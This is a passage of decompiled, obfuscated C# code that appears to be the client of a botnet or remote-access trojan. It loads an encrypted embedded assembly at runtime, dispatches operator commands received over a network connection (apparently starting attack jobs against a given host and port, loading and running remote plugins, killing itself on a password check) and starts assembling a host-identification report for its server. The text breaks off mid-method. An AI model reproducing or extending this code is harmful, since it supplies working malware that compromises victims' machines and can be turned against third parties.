		return Assembly.Load(Encoding.GetEncoding(1252).GetBytes(Class1.smethod_3("NEF35+rn5+fr5+fn5ubn55/n5+fn5+fnJ+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fnZ+fn5/UGofXnm/C0CJ/oM7QIO09QWgdXWVZOWUhUB0pIVVVWWwdJTAdZXFUHUFUHKzY6B1RWS0wV9PTxC+fn5+fn5+c3LOfnM+jq5yK1czXn5+fn5+fn58fn6Qjy6O/n5wPn5+ft5+fn5+fndSHn5+cH5+fnJ+fn5+cn5+cH5+fn6efn6+fn5+fn5+fr5+fn5+fn5+dn5+fn6efn5+fn5+rnJ2zn5/fn5/fn5+fn9+fn9+fn5+fn5/fn5+fn5+fn5+fn5ych5+cy5+fn5yfn52fq5+fn5+fn5+fn5+fn5+fn5+fn50fn5/Pn5+ePIOfnA+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fnB+fn7+fn5+fn5+fn5+fn7wfn5y/n5+fn5+fn5+fn5xVbTF9b5+fnewHn5+cH5+fnA+fn5+nn5+fn5+fn5+fn5+fn5wfn50cVWVpZSufn52fq5+fnJ+fn5+vn5+cF5+fn5+fn5+fn5+fn5+cn5+cnFVlMU1ZK5+fz5+fn50fn5+fp5+fnCefn5+fn5+fn5+fn5+fnJ+fnKefn5+fn5+fn5+fn5+fn5+dXIefn5+fn5y/n5+fp5+znjwzn5+f75+fo5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5z3pD/jn5/Hn5+la+efn8WTw5+fr5xHn5/oX6udA5+fn6Ofn+Oda+ufn8Wfy5+frWvvn5/Fn8efn62Xx5+frZfLn5+vpVvzn5/HnZfLn5+tW/efn8edl8ufn61b+5+fx8WXy5+frVv/n5/Hn+2fy5+fr+2fx5+fr7fIS5+4R5+fn+hfp5zrn5+fp5+f45+laAOfn8Wfy5+frWvvn5/Fn8efn62Xx5+frZfLn5+tWAefn8Vzu5+fp8WXy5+frVv3n5/HnZfLn5+tW/+fn8ef7Z/Ln5+v7Z/Hn5+vt8hLn7hEF6Q/45+fxEef6F+jn8ufn5+rn5/jpYvnn5+vxEuftEQnp6mT55+frEfoX6Ofy5+fn6+fn+Oli+ufn6/ES5+0RCenqZPrn5+sR+hfq5zHn5+fs5+f45+kPA+fn8Q8E5+fxt/3n5+gPBefn8f5WBufn8fHtdVD95en95ejz7xT95+39gVv95+foVgfn5/FaCOfn8fIS72UJ5+fx8hLn7hHx5xHn5+f6F+rnF+fn5+3n5/jpYvPn5+vx7fLu6g8K5+fxW/Pn5+jz6WPz5+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+3n5/jpYvPn5+vx7fLu6g8M5+fxW/Pn5+jz6WPz5+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+3n5/jpYvTn5+vx7fLu6g8K5+fxW/Pn5+jz6WP05+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+3n5/jpYvTn5+vx7fLu6g8M5+fxW/Pn5+jz6WP05+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+3n5/jpYvXn5+vx7fLu6g8K5+fxW/Pn5+jz6WP15+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+3n5/jpYvXn5+vx7fLu6g8M5+fxW/Pn5+jz6WP15+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+7n5/jpYvbn5+vx7fLu6g8K5+fxW+rn5+nz6WP25+fr7+4P6efnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+7n5/jpYvbn5+vx7fLu6g8M5+fxW+rn5+nz6WP25+fr7+4P6efnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+/n5/jpYvfn5+vx7fLu6g8K5+fxW+nn5+nz6WP35+fr7+4P6ufnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+/n5/jpYvfn5+vx7fLu6g8M5+fxW+nn5+nz6WP35+fr7+4P6ufnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5/Dn5/jpYvjn5+vx7fLu6g8K5+fxW+vn5+nz6WP45+fr7+4P6+fnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5/Dn5/jpYvjn5+vx7fLu6g8M5+fxW+vn5+nz6WP45+fr7+4P6+fnEvHt7uXo/eXo9PAUvxH6F+rnK+fn5/Hn5/jn6vHt/RXpEgTpYvbn5+v75ejy7hT16WL25+fr6etW7efn7ecSBOli9+fn6/vl6PLuFPXpYvfn5+vp61bp5+ft5xLnEfoX6ucE5+fn8ufn+OfpYvjn5+v75ejx7RT16WL45+fr6epW8efn7ecR5+fn+hfq5wTn5+fy5+f45+li8+fn6/vl6PHtFPXpYvPn5+vp+1YN5+fx5xHn5+fqF+rnL+fn5+fn5+fn6WLz5+fr+/tWDefn8efpYvTn5+v7+1YN5+fx5+li9efn6/v7Vg3n5/Hn6WL35+fr+/tW6efn7efpYvjn5+v7+1bx5+ft5xEF6Q/45+fxESk6MSno5+jn5+fn5/Pn5+ddGRUXFRwXHhke5+fn5+znU+fn5+vw5+cKZefnV/Dn58fu5+cKOltZUFVOWufn5+c3+Ofn7+fn5wo8Ouc/+Ofn9+fn5wouPDAr5+fnT/jn53/p5+cKKVNWSefn5+fn5+fp5+foPgSd8PDv5+fn4Qwa5/3n5+jn5+cM5+fn8Ofn5/rn5+cZ5+fnGOfn5w3n5+fr5+fn+ufn5/Ln5+fo5+fn7efn5+jn5+fz5+fnAefn5+jn5+fo5+fn6efn5+vn5+fn5/Hn6Ofn5+fn7ed953bn7eeP53bn7eeU53bn7eeo53bn7ee153bn7ecD6Hbn7ecu6BPo7edp6Dro7eeG6Hzo7edD6Xbn8eds6Vfp7efA6Xbn7efe68zr7ef17Mzr7ecS7Mzr7ecx7Mzr7edK7Mzr7edj7Mzr7ed+7Mzr7eeZ7Mzr7efR7LLs7efl7LLs7efz7czr7ecM7czr7ec87SntTudQ7efn7ed/7V/t7eef7V/t7ee97Xbn7efT7Xzo7efw7l/t7ecL7nbn7ecY7szr7ect7nbn7ed17nbn7eeX7obu7ee67nbn5+fn5+jn5+fn5+jn6Ofo6Ofn/ecQ5+zn6Ofo5+jo5+cX5xDn7Ofo5+zn6Ojn5ynnEOfs5+jn8Ofo6OfnPucQ5/Dn6Of05+jo5+dK5xDn8Ofr5/Tn6Af350/nEOf05+7n9Ofo5/fnWucQ5/Tn8ef152jn9+dl5xDn9Ofz5/jn7e3Z5xHnPWfh5xTnPWfm5xTn7e3Z5xHnPWfu6CLnPWf16CLn7ef86Cbn7ecI6Cnn7ec16C3n+Od56Djn+OeT6Dzn6OfN6YXn6OcO6oXn6Ocx6oXn6OdU6o/n6Odx6pnn6OeR6qPn6OfS6rXn6Of167nn5+fn5+rnbf+b5/Hn6Ofn5+fn6uet6KHn9+fq5+fn5+fq563ow+f/5+zn5+fn5+rnrejP5wvn8Ofn5+fn6udt/5vn8efx5+fn5+fq563ooef35/Pn5+fn5+rnrejD5//n9efn5+fn6uet6M/nC+f55+fn5+fq523/m+fx5/rn5+fn5+rnreih5/fn/Ofn5+fn6uet6MPn/+f+5+fn5+fq563oz+cL5wLnNwfn5+fnbf+b5zTnA+dPB+fn5+d955boQOcD57cH5+fn533noOhH5wTnFgjn5+fnbf+b5zTnBefn5+fn5+et9KzoTucF5+fn5+fn5630tehO5wXn5+fn5+fnrfTF6E7nBefn5+fn5+et9NDoUucF5+fn5+fn56304ehX5wXn5+fn5+fnrfT56VfnBefn5+fn5+et9AvpV+cF5x8I5+fn523vF+lb5wXnNgjn5+fnbe8t6WDnBefn5+fn5+et9EvpZucG5+fn5+fn5630celr5wbnPwjn5+fnbe9/6XDnBudWCOfn5+dt74/pdOcG518I5+fn523vn+l55wfn5+fn5+fnreyo6TTnB+fn5+fn5+et7LPpfucH57UI5+fn563ou+l05wnnuwjn5+fnbe/f6YnnCuf3Cefn5+dt7/XqiecL5zMJ5+fn523vFuqJ5wznbwnn5+fnbe8i6onnDeerCefn5+dt7znqiecO5+cK5+fn523vReqJ5w/nIwrn5+fnbe9a6pPnEOdfCufn5+dt72Tqk+cR55sK5+fn523veOqd5xLn1wrn5+fnbe+D6p3nE+cTC+fn5+dt75rqp+cU508L5+fn523vp+qn5xXniwvn5+fnbee36q3nFufbC+fn5+dt57zqYOcY5wcM5+fn523nx+o05xnnMwzn5+fnaOfQ6jTnGeeHDOfn5+dr/5vnNOcZ5+fn6OeJ6+fn6eeQ6+fn6OeX6+fn6efQ6ufn6OeX6+fn6efQ6ufn6uee6+fn6+eJ6+fn6Oen6+fn6OeJ6+fn6eeQ6+fn6OeX6+fn6efQ6ufn6OeX6+fn6efQ6ufn6uee6+fn6+eJ6+fn6Oen6+fn6OeJ6+fn6eeQ6+fn6OeX6+fn6efQ6ufn6OeX6+fn6efQ6ufn6uee6+fn6+eJ6+fn6Oen6+fn6Oeu6+fn6Oez6+fn6Oe16+fn6Oe16+fn6Oe76+fn6efQ6ufn6Oe76+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6OfH6+fn6efQ6ufn6OfQ6lDnm+fh51jnm+fh52Dnm+fh52jnm+fh53Dnm+fh53jnm+fh54Dnm+fh54jnm+fh55Dnm+fm55jnm+fh56Dnm+fh56jnm+fh57Dnm+fr6MDnm+fx6Mjnm+c059Dnm+c05wDnm+c05/Pnm+c05zDnm+c05yjnm+c05yjnluj86Njn2u005zDn4O0D6Njn6O405zDnm+cP6CjnoOgV6ODnm+c05wDnEO4r6PDoIe4x6OjoP+466PDoUe5D6JjnZe5O5xjnm+fh5xjnb+4p5wDofu5U6Ajoo+5g6ADos+5U6Ejnoeez6O/n7+cY5+/n8+cd5+/n++cY5+/n/+cd5xXnCufo6RXnYudd6RXnGuf16RXnWudU6RXn8ue76BXn+ufH6BXnAufi6BXnEue76BXnIufi6BXnMufi6BXnOucU6RXnSuc+6RXnUudL6Sjpwucd50jpwucd5+fqwucd5wfqwucd52fqwucd54fqwucd5wjoG+gi6CfoTOhy6IHokOif6Knor+jw5+jn5+fN6Rjn5+cO6hjn5+cx6hjn5+dU6vPn5+dx6u/n5+eR6vfn8Ofo5+fnEuu85+fnF+u85+fnI+u85+fnKuvA5+fnN+vF5+fnS+vF5+fnWevF5+fnYevJ5+fnQ+nO5+fnc+vT5+fnfevY5+fnA+jc5/fnCufp5+/nCefp5+nn+Ofq5/fnDOfr5+/nC+fr5+nn+efs5+/nDeft5/fnDuft5+nn+ufu5/fnEOfv5+/nD+fv5+nn++fw5/fnEufx5+/nEefx5+nn/Ofy5/fnFOfz5+/nE+fz5+nn/ef05+nn/uf25+nn/+f45+jnAOf45+nnAef65+nnAuf85+jnBOf+5+nnA+f+5+nnBecA5/bo62fn5+jn5+fn5+fn5+fn5+fnZefn5+nn5+fn5+fn5+fn5+jnbefn5+fn6efn5+fn5+fn5+fn6OdX6efn5+cw523oMOd86DDni+gw55ro5+fnIzRWS1xTTCXnMDdTXE5QVRVLU1PnNlxbV1xbLF1MVVsvSFVLU0xZ5zdTXE5QVecwVVdcWyxdTFVbL0hVS1NMWec5TEpMUF1MSyxdTFVbL0hVS1NMWec3U1xOUFU6W0hbTOc6UEtM5zdTXE5QVShZTlrnOkxZUEhTUGFMWecwN1NcTlBV51RaSlZZU1BJ5zpgWltMVOc0XFNbUEpIWlsrTFNMTkhbTOcsVVxU5zZJUUxKW+cVSltWWecwVV1WUkznMChaYFVKOUxaXFNb5yhaYFVKKkhTU0lISlLnKUxOUFUwVV1WUkzn54vIHixVSzBVXVZSTOddSFNcTEZG5zU2NSznOTw1NTA1LucqMzAsNTvnOiw5PSw55y9MSEtMWecuXFBL5zdTXE5QVS5cUEvnOmBaW0xUFSpWU1NMSltQVlVaFS5MVUxZUErnM1BaW0cY5ytIW0jnOmBaW0xUFTlcVVtQVEwVOkxZUEhTUGFIW1BWVRUtVllUSFtbTFlaFSlQVUhZYOcpUFVIWWAtVllUSFtbTFnnSU3nOmBaW0xUFTA25zRMVFZZYDpbWUxIVOdUWuc6TFlQSFNQYUznK0xaTFlQSFNQYUznTkxbRjVIVEznTkxbRitMWkpZUFdbUFZV505MW0YoXFtPVlnnTkxbRipcWVlMVVs6W0hbTOdOTFtGOltWVzZVK1BaSlZVVUxKW1BWVedOTFtGLF9MSlxbTDZVM1ZIS+dOTFtGL0haLVZZVOdOTFtGLF9MSlxbTDZVM1ZISyhZTlrnWkxbRixfTEpcW0w2VTNWSEsoWU5a5z1MWVpQVlXnTkxbRj1MWVpQVlXnOmBaW0xUFT5QVUtWXloVLVZZVFrnLVZZVOdOTFtGMFVXXFstVllU505MW0Y6W0hbTDZJUUxKW+daTFtGOltIW0w2SVFMSlvnTkxbRi5cUEvnMFVQW1BIU1BhTOcsX0xKXFtM5zpbVlfnLF1MVVsvSFVLU0xZ5yxfTEpcW1BWVSpWVFdTTFtM50hLS0YsX0xKXFtQVlUqVlRXU0xbTOdZTFRWXUxGLF9MSlxbUFZVKlZUV1NMW0znOltIWVtMS+dIS0tGOltIWVtMS+dZTFRWXUxGOltIWVtMS+c6W1ZXV0xL50hLS0Y6W1ZXV0xL51lMVFZdTEY6W1ZXV0xL5zBVV1xb50hLS0YwVVdcW+dZTFRWXUxGMFVXXFvnNlxbV1xb50hLS0Y2XFtXXFvnWUxUVl1MRjZcW1dcW+c5TEpMUF1MS+dIS0tGOUxKTFBdTEvnWUxUVl1MRjlMSkxQXUxL5zpMVUvnNlU5TEpMUF1MS+csX0xKXFtMS+dM5yMsX0xKXFtMNlUzVkhLKFlOWiVSRkYpSEpSUFVOLVBMU0vnIzpbSFtMNklRTEpbJVJGRilISlJQVU4tUExTS+c1SFRM5ytMWkpZUFdbUFZV5yhcW09WWecqXFlZTFVbOltIW0znOltWVzZVK1BaSlZVVUxKW1BWVecsX0xKXFtMNlUzVkhL5y9IWi1WWVTnLF9MSlxbTDZVM1ZISyhZTlrnMFVXXFstVllU5zpbSFtMNklRTEpb51ZJUUxKW+dUTFtPVkvnWkxVS0xZ50pIU1NJSEpS51lMWlxTW+dIWU5a50nnXUhTXEznWltIW0w2SVFMSlvnWlBLTOc6YFpbTFQVOUxNU0xKW1BWVecoWlpMVElTYDtQW1NMKFtbWVBJXFtM5yhaWkxUSVNgK0xaSllQV1tQVlUoW1tZUElcW0znKFpaTFRJU2AqVlVNUE5cWUhbUFZVKFtbWVBJXFtM5yhaWkxUSVNgKlZUV0hVYChbW1lQSVxbTOcoWlpMVElTYDdZVktcSlsoW1tZUElcW0znKFpaTFRJU2AqVldgWVBOT1soW1tZUElcW0znKFpaTFRJU2A7WUhLTFRIWVIoW1tZUElcW0znKFpaTFRJU2AqXFNbXFlMKFtbWVBJXFtM5zpgWltMVBU5XFVbUFRMFTBVW0xZVlc6TFldUEpMWucqVlQ9UFpQSVNMKFtbWVBJXFtM5y5cUEsoW1tZUElcW0znKFpaTFRJU2A9TFlaUFZVKFtbWVBJXFtM5yhaWkxUSVNgLVBTTD1MWVpQVlUoW1tZUElcW0znOmBaW0xUFStQSE5VVlpbUEpa5ytMSVxOTkhJU0woW1tZUElcW0znK0xJXE5OUFVONFZLTFrnOmBaW0xUFTlcVVtQVEwVKlZUV1BTTFk6TFldUEpMWucqVlRXUFNIW1BWVTlMU0hfSFtQVlVaKFtbWVBJXFtM5zlcVVtQVEwqVlRXSFtQSVBTUFtgKFtbWVBJXFtM5zpMWVBIU1BhSElTTChbW1lQSVxbTOc6W1lMSFTnKlNWWkznO1YoWVlIYOcrUFpXVlpM5ypWVFdQU0xZLkxVTFlIW0xLKFtbWVBJXFtM5ztgV0znLkxbO2BXTOcoWlpMVElTYOcuTFsoWlpMVElTYOc5XFVbUFRMO2BXTC9IVUtTTOcuTFs7YFdMLVlWVC9IVUtTTOcuTFsqXFpbVlQoW1tZUElcW0xa505MW0Y9SFNcTOcsVFdbYOcrTFNMTkhbTOcqVlRJUFVM5zpgWltMVBU7T1lMSEtQVU7nMFVbTFlTVkpSTEvnKlZUV0hZTCxfSk9IVU5M5zlMVFZdTOcsXUxVWyhZTlrn5+fn5+oH5+fn5+e7BJbLNbeRKH8GkgtPFB0p5++eYUM9ABvHcOwH6egD/+4H6ej5C/kD8gfr+fj5C/kD+fwD7Afo6Pn46e3v6u34++vn5+fn6+jn5+fq7fj/6e316u34AO3t/PkE6APqB+fo6u35COrt+Qzt5+gE7PkD7efo+QME7OoH5/XrB+f4++oH5+nrB+f5A+wH6Oj5A+sH5/kQ6wfn+RTqB+cD6wfo6APrB+f4AO0H6egD+QPq7fkY7Afo6PkY6u358+wH6Oj58+rt+e/sB+jo+e/q7fn37Afo6Pn37gfp6Pj/+QPq7fkD6e0D6g/n9esP5/j76g/n6esP5/kD6w/n+RDrD+f5FOoP5wPrD+f4AOsH6Oj16wfo6OnsB+jo+FDrB+jo7+z8+QToA+0H6ej5YAPrB+cE7O3u6QTsBOzsB+joBOzsB+gD+WDt7un5A/kD6+7o+QPq7ugD7Afn+Wdo7+fo+Wds+Wdo7+fo+Wdo+Gdw7wfpBAP5Z2jp7u7qBAP4AOny5+n5Z3T5Z3T5Z3Tz9+jqBef3BecF5wXn6/Ho+Rjw7uv5GPkY+Rjp6/Ho+fPw7uv58/nz+fPp6/Ho+e/w7uv57/nv+e/p6/Ho+ffw7uv59/n3+ffp7O7p+P/p6u7o6e4H6egD+Wd88ujn7TdTXE5QVefnAejn/DVMWxQ+TEhdTAc3U1xOUFUHKUhaTOfn7Ojn5+fn8+jn7l86UFNMVVvn5wXo5wAqVldgWVBOT1sHqZAHXzpQU0xVWwcZFxgY5+cQ6OcLHhodSBtMFxwUSkkgTBQbSRxNFCBLSxwUGUhKHSBMTUoXSyAg5+fz6OfuGBUXFRcVF+fn7+jn7ujn5+fn7+jn7+fn5+fnBejn6Oc76f0+WUhXNVZVLF9KTFdbUFZVO09ZVl5a6Ofn5+fn5+citXM15+fn5+nn5+dh5+fnqyDn56sC5+c5Ois6V15vpeFT5zRqm/TySxFamOnn5+cqIUM8WkxZWkM1SFtPSFVDK1ZKXFRMVVtaQz1QWlxIUwc6W1xLUFYHGRcYF0M3WVZRTEpbWkM3WVZRTEpbBysrVjpMWUM3U1xOUFVDVklRQytMSVxOQzA3U1xOUFUVV0tJ5+fnTyHn5+fn5+fn5+fnZSHn5+cH5+fn5+fn5+fn5+fn5+fn5+fn5+fn51ch5+fn5+fn5+dGKlZZK1NTNEhQVedUWkpWWUxMFUtTU+fn5+fn5gznByfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn6Of35+fn/+fnZ+fn5+fn5+fn5+fn5+fn6Ofo5+fnF+fnZ+fn5+fn5+fn5+fn5+fn6Ofn5+fnL+fn5z8n5+cL6ufn5+fn5+fn5+cL6hvn5+c95zrnRuc95yznOec65zDnNuc150bnMOc15y3nNufn5+fnpOvW5efn6Ofn5+jn5+fn5+fn6Ofn5+fnJufn5+fn5+fr5+fn6efn5+fn5+fn5+fn5+fn5yvn5+fo5z3nSOdZ5y3nUOdT50znMOdV503nVufn5+fnC+fr5+fnO+dZ50jnVeda51PnSOdb51DnVudV5+fn5+fn55fra+nn5+jnOudb51nnUOdV507nLedQ51PnTOcw51XnTedW5+fnR+nn5+jnF+cX5xfnF+cX5xvnSecX5+fnK+f95+jnKudW51TnVOdM51XnW+da5+fnNedM51vnFOc+50znSOdd50znB+c351PnXOdO51DnVecH5ynnSOda50zn5+cX5+/n6Ocq51bnVOdX50jnVedg5zXnSOdU50zn5+fn51/nOudQ51PnTOdV51vn5+cf5+7n6Oct51DnU+dM5yvnTOda50rnWedQ51fnW+dQ51bnVefn5+fnN+dT51znTudQ51Xn5+fn5xfn7+fo5y3nUOdT50znPedM51nnWudQ51bnVefn5+fnGOcV5xfnFecX5xXnF+fn5x/n8+fo5zDnVedb50znWedV50jnU+c150jnVOdM5+fnMOc351PnXOdO51DnVecV50vnU+dT5+fnP+cA5+jnM+dM507nSOdT5yrnVudX52DnWedQ507nT+db5+fnKudW51fnYOdZ51DnTudP51vnB+eQ5wfnX+c651DnU+dM51XnW+cH5xnnF+cY5xjn5+fn5yfn8+fo5zbnWedQ507nUOdV50jnU+ct51DnU+dM51XnSOdU50zn5+cw5zfnU+dc507nUOdV5xXnS+dT51Pn5+cX5+7n6Oc351nnVudL51znSudb5zXnSOdU50zn5+fn5zfnU+dc507nUOdV5+fn5+cb5+/n6Oc351nnVudL51znSudb5z3nTOdZ51rnUOdW51Xn5+cY5xXnF+cV5xfnFecX5+fnH+fv5+jnKOda51rnTOdU50nnU+dg5wfnPedM51nnWudQ51bnVefn5xjnFecX5xXnF+cV5xfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fnF+fn8+fn53ch5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5w==", bool_0: true)));
	}

	private static void smethod_7(object sender, EventArgs2 e)
	{
		//IL_046a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0470: Invalid comparison between Unknown and I4
		Class3 @class = sender as Class3;
		try
		{
			Class0 class2 = new Class0(e.Byte_0);
			switch (e.Enum0_0)
			{
			case Class3.Enum0.const_1:
				if (Class9.Boolean_0)
				{
					@class.method_9(Class9.String_0 + Class1.smethod_3("msDm6enemrvm7Hp52eff297zmrvd7uPw3w==", bool_0: true));
					return;
				}
				Class9.smethod_0(Class9.Enum3.const_1, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class9.smethod_1();
				@class.method_9(Class1.smethod_3("TlRJG0Fnamr7LVjUXxs8Xm9kcWA=", bool_0: true));
				break;
			case Class3.Enum0.const_2:
				if (Class9.Boolean_0)
				{
					@class.method_9(Class9.String_0 + Class1.smethod_3("msDm6enemrvm7Hp52eff297zmrvd7uPw3w==", bool_0: true));
					return;
				}
				Class9.smethod_0(Class9.Enum3.const_0, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class9.smethod_1();
				@class.method_9(Class1.smethod_3("Tz5LG0Fnamr7LVjUXxs8Xm9kcWA=", bool_0: true));
				break;
			case Class3.Enum0.const_3:
				if (Class9.Boolean_0)
				{
					@class.method_9(Class9.String_0 + Class1.smethod_3("msDm6enemrvm7Hp52eff297zmrvd7uPw3w==", bool_0: true));
					return;
				}
				Class9.smethod_0(Class9.Enum3.const_2, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class9.smethod_1();
				@class.method_9(Class1.smethod_3("UD9LG0Fnamr7LVjUXxs8Xm9kcWA=", bool_0: true));
				break;
			case Class3.Enum0.const_4:
				if (Class9.Boolean_0)
				{
					Class9.smethod_2();
					@class.method_9(Class9.String_0 + Class1.smethod_3("msDm6enemnp52efD6Nvd7uPw3w==", bool_0: true));
				}
				else
				{
					@class.method_9(Class1.smethod_3("SWobQWdqavstWNRfGzxeb2RxYA==", bool_0: true));
				}
				break;
			case Class3.Enum0.const_5:
			{
				object[] parameter2 = new object[2]
				{
					class2.ReadString(),
					sender
				};
				new Thread(smethod_14).Start(parameter2);
				break;
			}
			case Class3.Enum0.const_6:
			{
				object[] parameter = new object[3]
				{
					class2.ReadString(),
					class2.ReadString(),
					sender
				};
				new Thread(smethod_15).Start(parameter);
				break;
			}
			case Class3.Enum0.const_8:
			{
				string @string = Encoding.Default.GetString(e.Byte_0);
				if (@string != Encoding.Default.GetString(Class1.smethod_1(Convert.FromBase64String(Class10.string_10), bool_0: false)))
				{
					(sender as Class3).method_9(Class1.smethod_3("BiszHikmId299eEADR4wMDQsLyE=", bool_0: true));
					return;
				}
				if (Class10.bool_0)
				{
					foreach (GClass0 item in list_0)
					{
						item.method_3();
					}
					Class7.smethod_3();
				}
				Process.GetCurrentProcess().Kill();
				break;
			}
			case Class3.Enum0.const_9:
				try
				{
					if (GClass2.smethod_3(Encoding.GetEncoding(1252).GetBytes(class2.ReadString())))
					{
						string text = GClass2.sortedList_1.Values[GClass2.sortedList_1.Count - 1].get_Name() + Class1.smethod_3("ms3uennZ5+ns394=", bool_0: true);
						if (Class10.bool_0)
						{
							text += Class1.smethod_3("mtvo3pp6ednnzdvw394=", bool_0: true);
							GClass2.smethod_0();
						}
						@class.method_9(text);
						break;
					}
					throw new Exception(GClass2.smethod_6());
				}
				catch (Exception)
				{
					@class.method_9(Class1.smethod_3("yubv4ePomr/s7OnstJrD6PDb5uN6ednn3prp7Jq75uzf297zmsbp297f3po=", bool_0: true));
				}
				break;
			case Class3.Enum0.const_10:
				try
				{
					PluginArgs val = Serializer.Deserialize(e.Byte_0);
					if (!GClass2.sortedList_1.ContainsKey(val.PluginGuid))
					{
						@class.method_9(Class1.smethod_3("yubv4ePomuh6ednn6e6a4Onv6N4=", bool_0: true));
						break;
					}
					IPlugin iplugin_ = GClass2.sortedList_1[val.PluginGuid];
					GClass2.smethod_7(sender, iplugin_, val);
				}
				catch (Exception ex)
				{
					@class.method_9(Class1.smethod_3("wNvj5t/emsrm7+HjennZ5+iav/Lf3e/u4+notA==", bool_0: true) + ex.Message);
				}
				break;
			case Class3.Enum0.const_11:
				try
				{
					Guid guid = new Guid(class2.ReadString());
					for (int i = 0; i < GClass2.sortedList_1.Count; i++)
					{
						if (GClass2.sortedList_1.Keys[i] == guid && (int)GClass2.sortedList_1.Values[i].get_CurrentState() == 1)
						{
							GClass2.sortedList_1.Values[i].Stop(sender);
							break;
						}
					}
				}
				catch
				{
					@class.method_9(Class1.smethod_3("wNvj5t/emu7pmnp52eft7unqmurm7+Hj6A==", bool_0: true));
				}
				break;
			case Class3.Enum0.const_13:
				bool_0 = true;
				break;
			case Class3.Enum0.const_17:
				@class.method_10(bool_1: true);
				break;
			default:
				@class.method_9(Class1.smethod_3("vOzp5d/o1sPo8Hp52efb5uPemsLf297f7A==", bool_0: true));
				break;
			case Class3.Enum0.const_19:
				bool_1 = true;
				int_0 = BitConverter.ToInt32(e.Byte_0, 0);
				@class.method_10(bool_1: true);
				break;
			case Class3.Enum0.const_20:
				if (Class9.Boolean_0)
				{
					@class.method_9(Class9.String_0 + Class1.smethod_3("msDm6enemrvm7Hp52eff297zmrvd7uPw3w==", bool_0: true));
					return;
				}
				Class9.smethod_0(Class9.Enum3.const_3, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class9.smethod_1();
				@class.method_9(Class1.smethod_3("TmdqcmdqbWRuG0H7LVjUZ2pqXxs8Xm9kcWA=", bool_0: true));
				break;
			}
			class2.Close();
		}
		catch
		{
		}
	}

	private static void smethod_8(object sender, EventArgs e)
	{
		Class3 @class = (Class3)sender;
		Class12 class2 = new Class12();
		class2.Write(Class2.smethod_1());
		class2.Write(Class14.smethod_0());
		class2.Write(Class10.string_7);
		class2.Write(Class1.smethod_3(@class.String_1, bool_0: true));
		class2.Write(Class10.string_11);
		byte[] data = class2.method_0();
